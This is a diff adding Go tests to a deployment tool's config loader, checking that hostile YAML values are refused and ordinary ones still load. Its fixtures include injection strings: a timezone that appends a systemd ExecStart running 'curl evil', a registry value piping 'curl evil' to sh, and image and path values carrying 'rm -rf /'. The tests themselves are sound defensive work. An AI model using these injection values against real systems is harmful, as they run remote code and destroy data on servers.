@@ -406,3 +406,52 @@ func TestUnknownWorkloadFieldIsRefusedForEveryRole(t *testing.T) {
 		}
 	}
 }
+
+// Hostile values in fields that reach a generated file or a generated command.
+// The project file is not a trust boundary — anyone who can edit it can already
+// deploy — but it is reviewed, and a value that reads as a timezone while
+// appending a root command to a scheduling unit defeats the review.
+func TestHostileValuesAreRefusedAtTheGrammar(t *testing.T) {
+	base := "api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\n"
+	for _, tt := range []struct{ name, yaml string }{
+		{"timezone injecting a unit directive",
+			base + `workloads: {w: {role: application, image: x:1}, j: {role: job, image: x:1, data_effect: none,` +
+				` schedule: {cron: "0 2 * * *", timezone: "UTC\n[Service]\nExecStart=/bin/sh -c 'curl evil'"}}}` + "\n"},
+		{"registry server with a command",
+			base + "workloads: {w: {role: application, image: x:1}}\nregistries: {r: {server: \"ghcr.io; curl evil | sh\"}}\n"},
+		{"image reference with a command",
+			base + "workloads: {w: {role: application, image: \"x:1; rm -rf /\"}}\n"},
+		{"base path with a quote",
+			base + "workloads: {w: {role: application, image: x:1}}\nbase_path: \"/var/lib/ob'; rm -rf /; '\"\n"},
+		{"env file path with a newline",
+			base + "workloads: {w: {role: application, image: x:1, env_files: [\"a.env\\nb\"]}}\n"},
+		{"health path with a quote",
+			base + "workloads: {w: {role: application, image: x:1, health: {http: \"/x\\\"y\", port: 80}}}\n"},
+	} {
+		if _, err := LoadBytes([]byte(tt.yaml), "ob.yml"); err == nil {
+			t.Errorf("%s: must be refused", tt.name)
+		}
+	}
+}
+
+// The same fields must still accept what real projects write.
+func TestOrdinaryValuesStillLoad(t *testing.T) {
+	base := "api_version: onebox.run/v1\napp: a\nenvironments: {p: {server: h}}\n"
+	for _, tt := range []struct{ name, yaml string }{
+		{"IANA timezone",
+			base + `workloads: {w: {role: application, image: x:1}, j: {role: job, image: x:1, data_effect: none,` +
+				` schedule: {cron: "0 2 * * *", timezone: "America/Argentina/Buenos_Aires"}}}` + "\n"},
+		{"registry with a port",
+			base + "workloads: {w: {role: application, image: x:1}}\nregistries: {r: {server: \"registry.example.com:5000\", username: bot}}\n"},
+		{"digest-pinned image",
+			base + "workloads: {w: {role: application, image: \"ghcr.io/acme/app:v1.2.3@sha256:" + "ab" + "cdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"}}\n"},
+		{"nested env file",
+			base + "workloads: {w: {role: application, image: x:1, env_files: [\"config/prod/.env\"]}}\n"},
+		{"health path with a query-free route",
+			base + "workloads: {w: {role: application, image: x:1, health: {http: /health/ready, port: 80}}}\n"},
+	} {
+		if _, err := LoadBytes([]byte(tt.yaml), "ob.yml"); err != nil {
+			t.Errorf("%s: must load: %v", tt.name, err)
+		}
+	}
+}
